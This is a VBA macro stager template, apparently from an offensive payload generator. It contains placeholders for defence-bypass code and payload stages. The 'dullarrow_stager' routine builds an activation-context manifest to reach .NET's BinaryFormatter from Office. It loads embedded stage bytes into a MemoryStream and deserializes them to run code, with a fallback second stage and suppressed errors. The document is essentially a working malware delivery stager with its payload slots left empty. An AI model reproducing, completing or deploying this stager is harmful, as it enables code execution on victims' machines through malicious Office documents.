{{bypassCode}}

{{moduleCode}}

Sub dullarrow_stager()

    Dim lpStage_0() As Byte
    Dim lpStage_1() As Byte
    
    Dim objMemoryStream_0 As Object
    Dim objDeserialize_0 As Object
    Dim objBinaryFormatter As Object
    Dim objMemoryStream_1 As Object
    Dim objDeserialize_1 As Object
    
    Dim i

    On Error Resume Next
    
    {{bypassCalls}}
    
    {{moduleCalls}}
    
    
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"

    Set actCtx = CreateObject("Microsoft.Windows.ActCtx")
    actCtx.ManifestText = manifest

    Set objBinaryFormatter = actCtx.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")

    Set objMemoryStream_0 = actCtx.CreateObject("System.IO.MemoryStream")

    lpStage_0 = getStage_0()

    For Each i In lpStage_0
        objMemoryStream_0.WriteByte i
    Next i

    objMemoryStream_0.Position = 0
	
    Set objDeserialize_0 = objBinaryFormatter.Deserialize_2(objMemoryStream_0)

    If Err.Number <> 0 Then

        Set objMemoryStream_1 = actCtx.CreateObject("System.IO.MemoryStream")

        lpStage_1 = getStage_1()

        For Each i In lpStage_1
            objMemoryStream_1.WriteByte i
        Next i

        objMemoryStream_1.Position = 0

        Set objDeserialize_1 = objBinaryFormatter.Deserialize_2(objMemoryStream_1)

    End If

End Sub


{{getStage_0}}

{{getStage_1}}

